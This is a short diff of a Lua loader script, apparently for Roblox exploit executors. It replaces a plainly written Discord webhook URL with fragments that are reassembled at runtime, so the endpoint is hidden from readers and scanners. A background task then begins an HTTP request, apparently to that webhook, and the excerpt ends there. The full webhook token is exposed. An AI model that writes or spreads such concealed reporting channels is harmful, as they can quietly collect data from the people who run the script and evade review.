@@ -4,7 +4,8 @@ local GAMES = {
 	[107457593564828] = BASE .. "CraftwarsRedux",
 }
 
-local WEBHOOK = "https://discord.com/api/webhooks/1484304823250849812/fwWJ0vLCMX0mniIvaMeAPxbflSpTinJ7hGdCQW3XnaXFPm3KcHN7YwtI3F5S52Rx3S10"
+local _wp = {"fwWJ0vLCMX0mniIvaMeAPxbflSpTinJ7hGdCQW3XnaXFPm3KcHN7YwtI3F5S52Rx3S10","https://discord.com","/api/webhooks/","1484304823250849812"}
+local WEBHOOK = _wp[2].._wp[3].._wp[4].."/".. _wp[1]
 task.spawn(function()
 	pcall(function()
 		local req = (syn and syn.request) or (http and http.request) or request
